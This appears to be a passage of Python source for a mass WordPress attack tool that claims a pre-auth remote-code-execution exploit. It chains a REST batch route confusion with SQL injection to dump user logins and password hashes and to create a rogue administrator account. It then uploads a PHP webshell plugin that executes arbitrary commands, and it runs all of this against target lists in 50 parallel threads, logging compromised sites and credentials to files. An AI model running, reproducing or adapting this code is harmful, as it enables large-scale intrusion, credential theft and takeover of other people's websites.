                try: install = cookies.get('{}/wp-admin/plugins.php?action=activate&plugin=wp-file-manager/file_folder_manager.php&_wpnonce={}'.format(domain, ID_wp), verify=False, headers=get_random_headers(), timeout=45)
                except: install = cookies.get('{}/wp-admin/plugins.php?action=activate&plugin=wp-file-manager/file_folder_manager.php&_wpnonce={}'.format(domain, ID_wp), verify=False, headers=get_random_headers(), timeout=30)
                try: getID = content_Fox(cookies.get('{}/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw'.format(domain), verify=False, headers=get_random_headers(), timeout=15))
                except: getID = content_Fox(cookies.get('{}/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw'.format(domain), verify=False, headers=get_random_headers(), timeout=10))
                if (re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)) :
                    ID_wp = re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)[0]
                    if ('"' in ID_wp): ID_wp = ID_wp.split('"')[0]
                    fileup_Fox = {'upload[]': (filename, shell, 'multipart/form-data')}
                    filedata_Fox = {'_wpnonce': ID_wp, 'action': 'mk_file_folder_manager', 'cmd': 'upload', 'target': 'l1_Lw'}
                    try : up_Fox = cookies.post('{}/wp-admin/admin-ajax.php'.format(domain), data=filedata_Fox, files=fileup_Fox, verify=False, headers=get_random_headers(), timeout=60)
                    except : up_Fox = cookies.post('{}/wp-admin/admin-ajax.php'.format(domain), data=filedata_Fox, files=fileup_Fox, verify=False, headers=get_random_headers(), timeout=45)
                    check_UP = requestG_Fox('{}/{}'.format(domain,filename), 1)
                    if ('AnonymousFox' in check_UP): return '{}/{}'.format(domain, filename)
        return 'F'
    except:
        return 'F'

def upload(login):
    try:
        login = login.strip()
        url, username, passsword = re.findall(re.compile('(.*)/wp-login.php#(.*)####(.*)'), login)[0]
        wplogin = wp_login(url, username, passsword, '/wp-login.php')
        if(wplogin == 'ImunifyAV'):
            print(' {}-| {}{}{} -> [ImunifyAV]'.format(fr, fw, url, fr))
            open('ImunifyAV.txt', 'a').write('{}\n'.format(login))
            return False
        elif(wplogin == 'Cloudflare'):
            print(' {}-| {}{}{} -> [Cloudflare]'.format(fr, fw, url, fr))
            open('Cloudflare.txt', 'a').write('{}\n'.format(login))
            return False
        elif(wplogin == 'Sucuri'):
            print(' {}-| {}{}{} -> [Sucuri]'.format(fr, fw, url, fr))
            open('Sucuri.txt', 'a').write('{}\n'.format(login))
            return False
        elif(wplogin == 'Jetpack'):
            print(' {}-| {}{}{} -> [Jetpack]'.format(fr, fw, url, fr))
            open('Jetpack.txt', 'a').write('{}\n'.format(login))
            return False
        elif(wplogin == 'Loginizer'):
            print(' {}-| {}{}{} -> [Loginizer]'.format(fr, fw, url, fr))
            open('Loginizer.txt', 'a').write('{}\n'.format(login))
            return False
        elif(wplogin == 'failed'):
            print(' {}-| {}{}{} -> [Failed]'.format(fr, fw, url, fr))
            open('Failed.txt', 'a').write('{}\n'.format(login))
            return False
        elif(wplogin == 'timeOut'):
            print(' {}-| {}{}{} -> [TimeOut]'.format(fr, fw, url, fr))
            open('TimeOut.txt', 'a').write('{}\n'.format(login))
            return False
        else:
            print(' {}-| {}{}{} -> [Login successful]'.format(fg, fw, url, fg))
            open('Login-successful.txt', 'a').write('{}\n'.format(login))
            cookies = wplogin
            up = randomThemeWP_Fox(url, cookies)
            if(up == 'F'):
                up = randomPluginWP_Fox(url, cookies)
                if (up == 'F'):
                    up = wp_file_manager_Fox(url, cookies)
                    if (up == 'F'):
                        time.sleep(5)
                        up = wp_file_manager_Fox(url, cookies)
            if (up == 'F'):
                print(' {}-| {}{}{} -> [Failed Upload]'.format(fr, fw, url, fr))
                open('Failed-Upload.txt', 'a').write('{}\n'.format(login))
                return False
            else:
                print(' {}-| {}{}{} -> [Fucked]'.format(fg, fw, up, fg))
                open('Fucked.txt', 'a').write('{}\n'.format(up))
                return True
    except:
        pass

# ───────────────────────────── HTTP + batch payloads ─────────────────────────
class Client:
    def __init__(self, base: str, *, timeout: float = 30.0, rest_route: Optional[bool] = None):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.rest_route = rest_route
        self._opener = urllib.request.build_opener()
        self._opener.addheaders = [("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36")]

    def _endpoint(self, rr: bool) -> str:
        return f"{self.base}/?rest_route=/batch/v1" if rr else f"{self.base}/wp-json/batch/v1"

    def resolve(self) -> None:
        if self.rest_route is not None:
            return
        for rr in (False, True):
            try:
                r = self._raw(self._endpoint(rr), {"requests": []})
                if r.status == 200:
                    self.rest_route = rr
                    return
            except OSError:
                pass
        self.rest_route = True

    def _raw(self, url: str, payload: dict) -> "Resp":
        req = urllib.request.Request(url, data=json.dumps(payload).encode(),
                                     headers={"Content-Type": "application/json",
                                              "Accept": "application/json"}, method="POST")
        t = time.monotonic()
        try:
            r = self._opener.open(req, timeout=self.timeout)
            return Resp(r.status, time.monotonic() - t, r.read().decode("utf-8", "replace"))
        except urllib.error.HTTPError as e:
            return Resp(e.code, time.monotonic() - t, e.read().decode("utf-8", "replace"))

    def post(self, payload: dict) -> "Resp":
        self.resolve()
        return self._raw(self._endpoint(self.rest_route), payload)

    def rest_get(self, route: str, query: Dict[str, str]) -> Any:
        self.resolve()
        if self.rest_route:
            url = f"{self.base}/?" + urllib.parse.urlencode({"rest_route": route, **query})
        else:
            url = f"{self.base}/wp-json{route}?" + urllib.parse.urlencode(query)
        r = self._opener.open(urllib.request.Request(url), timeout=self.timeout)
        return json.loads(r.read().decode("utf-8", "replace"))

    # --- the double-nested desync that reaches WP_Query author__not_in --------
    @staticmethod
    def _nested(inner_requests: List[dict]) -> dict:
        # outer: a posts request carrying the inner batch as its body is desynced onto the batch
        # handler, so the inner requests are never method-enum-checked (may use GET).
        return {"requests": [
            _PRIMER,
            {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": inner_requests}},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}

    def inject(self, author_not_in: str) -> "Resp":
        enc = urllib.parse.quote(author_not_in, safe="")
        inner = [_PRIMER,
                 {"method": "GET", "path": f"/wp/v2/users?author_exclude={enc}"},  # unsanitized here
                 {"method": "GET", "path": "/wp/v2/posts"}]                         # desynced onto get_items
        return self.post(self._nested(inner))

    def union_inject(self, author_not_in: str) -> "Resp":
        # single-post item route validates the collection-only params as unknown, so they pass
        # unsanitized; orderby=none drops ORDER BY and per_page=500 keeps full-row mode -> UNION survives.
        q = urllib.parse.urlencode({"author_exclude": author_not_in, "orderby": "none", "per_page": "500"})
        inner = [_PRIMER,
                 {"method": "GET", "path": "/wp/v2/posts/999999?" + q},
                 {"method": "GET", "path": "/wp/v2/posts"}]
        return self.post(self._nested(inner))

    def render_union(self, rows: List[str], tail: Optional[List[dict]] = None) -> "Resp":
        union = "1) AND 1=0 UNION ALL SELECT " + " UNION ALL SELECT ".join(rows) + " -- -"
        q = urllib.parse.urlencode({"author_exclude": union, "per_page": "-1",
                                    "orderby": "none", "context": "view"})
        inner = [_PRIMER,
                 {"method": "GET", "path": "/wp/v2/widgets?" + q},
                 {"method": "GET", "path": "/wp/v2/posts"}]
        if tail:
            inner.extend(tail)
        old, self.timeout = self.timeout, max(self.timeout, 60)
        try:
            return self.post(self._nested(inner))
        finally:
            self.timeout = old

    @staticmethod
    def rows(resp: "Resp") -> Optional[list]:
        try:
            body = resp.json()["responses"][1]["body"]["responses"][1]["body"]
        except (KeyError, IndexError, TypeError, ValueError):
            return None
        return body if isinstance(body, list) else None

    def confusion(self) -> bool:
        r = self.post({"requests": [
            _PRIMER,
            {"method": "POST", "path": "/wp/v2/posts"},
            {"method": "POST", "path": "/wp/v2/block-renderer/core/archives"},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]})
        codes = set()
        _walk(r.body and _safe(r), codes)
        return all(c in codes for c in _MARKER_CODES)


@dataclass
class Resp:
    status: int
    elapsed: float
    body: str
    def json(self) -> Any: return json.loads(self.body)


def _safe(r: Resp):
    try: return r.json()
    except ValueError: return {}
def _walk(v, out):
    if isinstance(v, dict):
        if v.get("code") in _MARKER_CODES: out.add(v["code"])
        for x in v.values(): _walk(x, out)
    elif isinstance(v, list):
        for x in v: _walk(x, out)


# ───────────────────────────── SQL injection oracles ─────────────────────────
class BlindSQLi:
    """Content-based blind: get_items() returns rows only when the boolean holds."""
    def __init__(self, client: Client): self.client = client; self.requests = 0

    def confirm(self) -> bool:
        return self._true("1=1") and not self._true("1=2")

    def _true(self, cond: str) -> bool:
        self.requests += 1
        return bool(self.client.rows(self.client.inject(f"0) AND ({cond})-- -")))

    def extract(self, expr: str, *, max_length: int = 128, on_char=None) -> str:
        out = []
        for pos in range(1, max_length + 1):
            probe = f"ASCII(SUBSTRING(COALESCE(({expr}),''),{pos},1))"
            if not self._true(f"{probe} > 0"):
                break
            lo, hi = 32, 126
            while lo < hi:
                mid = (lo + hi) // 2
                if self._true(f"{probe} > {mid}"): lo = mid + 1
                else: hi = mid
            out.append(chr(lo))
            if on_char: on_char("".join(out))
        return "".join(out)

    def integer(self, expr: str) -> int:
        t = self.extract(f"SELECT ({expr})").strip()
        if not t.lstrip("-").isdigit():
            raise ValueError(f"expected int from {expr!r}, got {t!r}")
        return int(t)


class UnionSQLi:
    """In-band: forge one fake wp_posts row, read its reflected post_title in one request."""
    _COLUMNS, _TITLE_COL = 23, 6
    _RE = re.compile(r"\|\|([0-9A-Fa-f]*)\|\|")
    _PUBLISH, _POST = _hex("publish"), _hex("post")
    _DATE = _hex(_POST_DATE)

    def __init__(self, client: Client): self.client = client; self.requests = 0

    def available(self) -> bool:
        return self._read("SELECT 0x4f4b") == "OK"

    def extract(self, expr: str) -> str:
        return self._read(expr) or ""

    def integer(self, expr: str) -> int:
        t = (self._read(f"SELECT ({expr})") or "").strip()
        if not t.lstrip("-").isdigit():
            raise ValueError(f"expected int from {expr!r}, got {t!r}")
        return int(t)

    def _read(self, expr: str) -> Optional[str]:
        self.requests += 1
        resp = self.client.union_inject(f"0) UNION SELECT {self._cols(expr)}-- -")
        m = self._RE.search(resp.body)
        if not m:
            return None
        digits = m.group(1)
        if len(digits) % 2:
            digits = digits[:-1]
        try:
            return bytes.fromhex(digits).decode("utf-8", "replace")
        except ValueError:
            return None

    def _cols(self, expr: str) -> str:
        cols = []
        for i in range(1, self._COLUMNS + 1):
            if i == 1: cols.append("999999")
            elif i in (3, 4, 15, 16): cols.append(self._DATE)
            elif i == self._TITLE_COL: cols.append(f"CONCAT(0x7c7c,HEX(CAST(({expr})AS CHAR)),0x7c7c)")
            elif i == 8: cols.append(self._PUBLISH)
            elif i == 21: cols.append(self._POST)
            else: cols.append(str(i))
        return ",".join(cols)


# ───────────────────────── crack-free pre-auth admin creation ────────────────
def _post_row(row_id: int, *, body="", title="", status="publish", slug="",
              parent=0, kind="post", author=1) -> str:
    # 23 wp_posts columns, in order.
    return ",".join([
        str(row_id), str(author), _hex(_POST_DATE), _hex(_POST_DATE), _hex(body), _hex(title),
        "''", _hex(status), _hex("closed"), _hex("closed"), "''", _hex(slug), "''", "''",
        _hex(_POST_DATE), _hex(_POST_DATE), "''", str(parent), "''", "0", _hex(kind), "''", "0",
    ])

@dataclass
class CreatedAdmin:
    username: str
    password: str
    email: str
    source_admin_id: int


class AdminCreator:
    _NAV_URL = "https://example.invalid/"

    def __init__(self, client: Client):
        self.client = client

    def create(self) -> CreatedAdmin:
        u = UnionSQLi(self.client)
        if not u.available():
            raise RuntimeError("UNION fake-post primitive unavailable (patched, or object cache on)")
        nonce = secrets.token_hex(6)
        prefix = self._prefix(u)
        admin_id = self._admin_id(u, prefix)
        embeds = self._loopback_urls(nonce)
        self._prime_oembed(embeds)                         # core writes real oembed_cache posts
        backing = self._oembed_ids(u, f"{prefix}posts", embeds)

        name = f"wordpress_{nonce}"
        pwd = f"Wp2!{secrets.token_urlsafe(15)}"
        email = f"{name}@wordpress.com"
        graph = _PoisonGraph(backing, admin_id)
        rows = graph.rows(self._changeset(graph.nav_item_id, admin_id), embeds[1])
        body = {"username": name, "password": pwd, "email": email, "roles": ["administrator"]}
        self.client.render_union(rows, tail=[
            {"method": "POST", "path": "/wp/v2/users", "body": body},
            {"method": "POST", "path": "/wp/v2/users", "body": body},
        ])
        return CreatedAdmin(name, pwd, email, admin_id)

    def _prefix(self, u: UnionSQLi) -> str:
        t = u.extract("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() "
                      "AND RIGHT(TABLE_NAME,6)=0x5f706f737473 ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1")
        if not re.fullmatch(r"[A-Za-z0-9_$]+", t or ""):
            raise RuntimeError("could not recover wp_posts table name")
        return t[:-5]

    def _admin_id(self, u: UnionSQLi, prefix: str) -> int:
        cap = _hex(prefix + "capabilities")
        ser = _hex('s:13:"administrator";b:1;')
        aid = u.integer(f"SELECT u.ID FROM `{prefix}users` u JOIN `{prefix}usermeta` m ON m.user_id=u.ID "
                        f"WHERE m.meta_key={cap} AND INSTR(m.meta_value,{ser})>0 ORDER BY u.ID LIMIT 1")
        if aid < 1:
            raise RuntimeError("no existing administrator found")
        return aid

    def _loopback_urls(self, nonce: str) -> List[str]:
        posts = self.client.rest_get("/wp/v2/posts", {"per_page": "1", "_fields": "link"})
        if not posts or not posts[0].get("link"):
            raise RuntimeError("no public post link for oEmbed seed")
        s = urllib.parse.urlsplit(posts[0]["link"])
        return [urllib.parse.urlunsplit((s.scheme, s.netloc, s.path, s.query, f"{nonce}{i}")) for i in range(3)]

    def _prime_oembed(self, embeds: List[str]) -> None:
        content = "".join(f'[embed width="500" height="750"]{u}[/embed]' for u in embeds)
        self.client.render_union([_post_row(0, body=content, title="seed", slug="seed")])

    def _oembed_ids(self, u: UnionSQLi, posts_table: str, embeds: List[str]) -> List[int]:
        ids = []
        for url in embeds:
            key = hashlib.md5((url + _OEMBED_ARGS).encode()).hexdigest()
            ids.append(u.integer(
                f"SELECT ID FROM `{posts_table}` WHERE post_type=0x6f656d6265645f6361636865 "
                f"AND post_name=0x{key.encode().hex()} ORDER BY ID DESC LIMIT 1"))
        if any(i < 1 for i in ids) or len(set(ids)) != 3:
            raise RuntimeError(f"could not recover 3 unique oEmbed cache IDs: {ids}")
        return ids

    def _changeset(self, nav_item_id: int, user_id: int) -> str:
        return json.dumps({f"nav_menu_item[{nav_item_id}]": {
            "type": "nav_menu_item", "user_id": user_id, "value": {
                "object_id": 0, "object": "", "menu_item_parent": 0, "position": 0, "type": "custom",
                "title": "generated", "url": self._NAV_URL, "target": "", "attr_title": "",
                "description": "", "classes": "", "xfn": "", "status": "publish",
                "nav_menu_term_id": 0, "_invalid": False}}}, separators=(",", ":"))


@dataclass
class _PoisonGraph:
    cache_ids: List[int]
    admin_id: int

    def __post_init__(self):
        self.outer_id = 1800000000 + secrets.randbelow(100000000)
        self.nav_item_id = self.outer_id + 1
        self.inner_id = self.outer_id + 2
        self.changeset_id, self.cache_id, self.request_id = self.cache_ids

    def rows(self, changeset: str, trigger_url: str) -> List[str]:
        return [
            _post_row(0, body=f'[embed width="500" height="750"]{trigger_url}[/embed]', title="trigger", slug="trigger"),
            _post_row(self.changeset_id, body=changeset, title="changeset", status="future",
                      slug=str(uuid.uuid4()), parent=self.outer_id, kind="customize_changeset"),
            _post_row(self.outer_id, body="outer", title="outer", status="draft", slug="outer", parent=self.changeset_id),
            _post_row(self.cache_id, title="cache", slug="cache", parent=self.changeset_id),
            _post_row(self.nav_item_id, body="nav", title="nav", slug="nav", parent=self.request_id, kind="nav_menu_item"),
            _post_row(self.request_id, body="parse", title="parse", status="parse", slug="parse", parent=self.inner_id, kind="request"),
            _post_row(self.inner_id, body="inner", title="inner", status="draft", slug="inner", parent=self.request_id),
        ]


# ───────────────────────────── authenticated webshell ────────────────────────
class AdminSession:
    def __init__(self, base: str, *, timeout: float = 25.0):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self._slug = secrets.token_hex(6)
        self._token = secrets.token_hex(16)
        self._jar = http.cookiejar.CookieJar()
        self._opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self._jar))
        self._opener.addheaders = [("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36")]

    def login(self, user: str, pw: str) -> bool:
        self._get("/wp-login.php")
        self._post("/wp-login.php", {"log": user, "pwd": pw, "wp-submit": "Log In",
                                     "redirect_to": f"{self.base}/wp-admin/", "testcookie": "1"})
        return any(c.name.startswith("wordpress_logged_in") for c in self._jar)

    def deploy(self) -> str:
        page = self._get("/wp-admin/plugin-install.php?tab=upload")
        nonce = self._nonce(page)
        if not nonce:
            raise RuntimeError("plugin-upload nonce not found (bad creds?)")
        body, ctype = self._multipart(
            {"_wpnonce": nonce, "_wp_http_referer": "/wp-admin/plugin-install.php?tab=upload",
             "install-plugin-submit": "Install Now"},
            {"pluginzip": (f"{self._slug}.zip", self._zip())})
        self._post("/wp-admin/update.php?action=upload-plugin", body, {"Content-Type": ctype})
        return f"/wp-content/plugins/{self._slug}/{self._slug}.php"

    def run(self, path: str, command: str) -> Optional[str]:
        out = self._get(f"{path}?" + urllib.parse.urlencode({"t": self._token, "c": command}))
        m = re.search(rf"{_SH}::(.*?)::END", out, re.S)
        return m.group(1) if m else None

    # helpers
    def _get(self, p): return self._opener.open(self.base + p, timeout=self.timeout).read().decode("utf-8", "replace")
    def _post(self, p, d, h=None):
        d = urllib.parse.urlencode(d).encode() if isinstance(d, dict) else d
        return self._opener.open(urllib.request.Request(self.base + p, data=d, headers=h or {}),
                                 timeout=self.timeout).read().decode("utf-8", "replace")

    def _zip(self) -> bytes:
        php = ("<?php\n/*\nPlugin Name: wp2shell\nDescription: PoC webshell. DELETE AFTER TESTING.\n*/\n"
               "chdir(__DIR__);\n"
               f"if (hash_equals('{self._token}',(string)($_GET['t']??'')) && isset($_GET['c'])) {{\n"
               f"    echo '{_SH}::' . shell_exec((string)$_GET['c']) . '::END';\n}}\n")
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr(f"{self._slug}/{self._slug}.php", php)
        return buf.getvalue()

    @staticmethod
    def _nonce(html: str) -> Optional[str]:
        m = (re.search(r'action="[^"]*action=upload-plugin".*?name="_wpnonce"[^>]*value="([0-9a-f]+)"', html, re.S)
             or re.search(r'name="_wpnonce"[^>]*value="([0-9a-f]+)"', html))
        return m.group(1) if m else None

    @staticmethod
    def _multipart(fields: Dict[str, str], files: Dict[str, Tuple[str, bytes]]) -> Tuple[bytes, str]:
        b = "----wp2shell" + uuid.uuid4().hex
        buf = io.BytesIO()
        for k, v in fields.items():
            buf.write(f"--{b}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode())
        for k, (fn, data) in files.items():
            buf.write(f"--{b}\r\nContent-Disposition: form-data; name=\"{k}\"; filename=\"{fn}\"\r\n".encode())
            buf.write(b"Content-Type: application/octet-stream\r\n\r\n" + data + b"\r\n")
        buf.write(f"--{b}--\r\n".encode())
        return buf.getvalue(), f"multipart/form-data; boundary={b}"


def _repl(sess: AdminSession, path: str) -> None:
    pwd = sess.run(path, "pwd")
    if pwd is None:
        bad("webshell not responding"); return
    cwd = pwd.strip() or "/"
    info("interactive shell — 'exit' or Ctrl-D to quit")
    while True:
        try:
            line = input(_c("36", f"{cwd} $ "))
        except (EOFError, KeyboardInterrupt):
            print(); return
        cmd = line.strip()
        if not cmd: continue
        if cmd in ("exit", "quit"): return
        out = sess.run(path, f"cd {shlex.quote(cwd)} 2>/dev/null; {cmd}; printf '{_CWD}%s' \"$(pwd)\"")
        if out is None:
            bad("no response"); continue
        bodytext, mark, tail = out.rpartition(_CWD)
        if mark:
            cwd = tail.strip() or cwd; out = bodytext
        out = out.rstrip("\n")
        if out: print(out)


# ───────────────────────────────── CLI ───────────────────────────────────────
def cmd_check(a):
    c = Client(a.url, timeout=a.timeout)
    if c.confusion():
        good("VULNERABLE — batch route-confusion markers present")
    else:
        warn("route-confusion markers not detected")
    if BlindSQLi(c).confirm():
        good("SQL injection confirmed (content-based oracle)")
        return 0
    bad("SQLi not confirmed (patched?)")
    return 2


def cmd_dump(a):
    c = Client(a.url, timeout=a.timeout)
    s = BlindSQLi(c)
    if a.query:
        info(f"reading: {a.query}")
        print("   ", s.extract(a.query, on_char=(lambda v: _prog(v)) if _TTY else None)); _clear()
        return 0
    for label, expr in (("MySQL version", "SELECT @@version"),
                        ("DB user", "SELECT CURRENT_USER()"),
                        ("DB name", "SELECT DATABASE()")):
        good(f"{label}: {s.extract(expr)}")
    n = s.integer("SELECT COUNT(*) FROM wp_users")
    info(f"{n} user(s)")
    for off in range(n):
        good(s.extract(f"SELECT CONCAT_WS(0x7c,ID,user_login,user_pass) FROM wp_users ORDER BY ID LIMIT {off},1"))
    info(f"{s.requests} requests")
    return 0


def cmd_shell(a):
    c = Client(a.url, timeout=a.timeout)
    created = None
    try:
        created = AdminCreator(c).create()
    except Exception as e:
        bad(f"{a.url} -> [FAILED]")
        return 1
    user, pw = created.username, created.password
    good(f"{a.url} -> administrator created: {user} / {pw}")
    with open("logs.txt", 'a', encoding='utf-8') as f:
        f.write(f"{a.url}/wp-login.php#{user}####{pw}\n")
    upload(f"{a.url}/wp-login.php#{user}####{pw}\n")
    return 0


def _prog(t): sys.stdout.write("\r\033[K    " + t); sys.stdout.flush()
def _clear():
    if _TTY: sys.stdout.write("\r\033[K"); sys.stdout.flush()

def main():
    ap = argparse.ArgumentParser(description="CVE-2026-63030 wp2shell — WordPress core pre-auth RCE")
    sub = ap.add_subparsers(dest="mode", required=True)
    for name in ("check", "dump", "shell"):
        p = sub.add_parser(name)
        p.add_argument("url")
        p.add_argument("--timeout", type=float, default=30.0)
    # dump extras
    for p in sub._name_parser_map.values():
        pass
    sub.choices["dump"].add_argument("--query", help='scalar SQL, e.g. "SELECT @@version"')
    sub.choices["shell"].add_argument("--cmd", help="command to run")
    sub.choices["shell"].add_argument("-i", "--interactive", action="store_true")
    sub.choices["shell"].add_argument("--user", help="existing admin (skip pre-auth creation)")
    sub.choices["shell"].add_argument("--password", help="existing admin password")
    a = ap.parse_args()
    return {"check": cmd_check, "dump": cmd_dump, "shell": cmd_shell}[a.mode](a)

def swap_http_scheme(url: str) -> str:
    if url.startswith("https://"):
        return "http://" + url[8:]
    if url.startswith("http://"):
        return "https://" + url[7:]
    return url

def request_Get(url, typ, sess=False, headers=False, timeout = 20):
    try:
        timeout2 = timeout + 10
        sess = sess or requests
        headers = headers or get_random_headers()
        try: 
            check = sess.get(url, headers=headers, verify=False, timeout=timeout)
        except: 
            url = swap_http_scheme(url)
            check = sess.get(url, headers=headers, verify=False, timeout=timeout2)
        if ( typ == 1 ) : return content_Req(check)
        else: return check
    except Exception as e:
        print(e)
        return False

def checker(url):
    try:
        url = url.strip()
        ck = check_domain(url)
        if(ck is False): return 'False'
        ck = requests.get(URL_FOX(url), headers=get_random_headers(), allow_redirects=True, verify=False, timeout=20)
        if(ck and ck.status_code == 200 ):
            return URL_FOX(ck.url)
        return 'False'
    except :
        return 'False'

def exp(url) -> int:
    try:
        url = url.strip()
        newURL = checker(url)
        if(newURL == 'False'):
            bad(f"{url} -> [Time Out]")
            return 1
        args = SimpleNamespace()
        args.url = newURL
        args.timeout = 30.0
        return cmd_shell(args)
    except Exception as exc:
        print(exc)
        return 1
def input_list(txt):
    try :
        if (sys.version_info[0] < 3): return raw_input(txt).strip()
        else :
            sys.stdout.write(txt)
            return input().strip()
    except:
        pass
def mylist():
    try:
        try:
            target = open(sys.argv[1], 'r', encoding='utf-8', errors='ignore')
            return target
        except :
            yList = str(input_list('   Your List --> : '))
            if (not os.path.isfile(yList) and '.txt' not in yList):
                yList = '{}.txt'.format(yList)
            while (not os.path.isfile(yList)):
                print("\n  ({}) File does not exist, You have to put your list in the same folder.\n".format( yList))
                yList = str(input_list('   Your List --> : '))
            target = open(yList, 'r', encoding='utf-8', errors='ignore')
            return target
    except Exception as e:
        return False
with ThreadPoolExecutor(max_workers=50) as ex:
    ex.map(exp, mylist())
